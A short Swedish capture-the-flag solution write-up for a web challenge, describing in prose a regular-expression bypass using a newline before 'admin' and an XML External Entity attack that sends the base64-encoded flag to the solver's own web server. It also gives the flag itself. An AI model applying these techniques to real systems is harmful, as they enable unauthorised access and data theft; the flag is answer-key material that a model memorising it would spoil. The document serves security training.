## Tips/ledtrådar
* Riktiga haxxers vet hur man exfillar.

# Steg 1: Komma runt regexp.
* Besök instansen och ange en sträng med radbrytning och `admin` på egen rad.
* Därefter har man tillgång till `/dev`.

# Steg 2: Exfiltration med XML External Entity
* Starta en egen webserver som kan skicka exfil.xml och exfil.dtd.
  * Ersätt `$WEBSERVER` med URL till egen server.
* Besök `/dev?template=$EXFILXMLURL`.
* Den egna servern får nu bas 64-kodade flaggan i sin web-logg.



## Flagga 

Flaggan finns (base64 kodad) i `src/flag.txt` (aka undut{xxe_is_un4gettable})
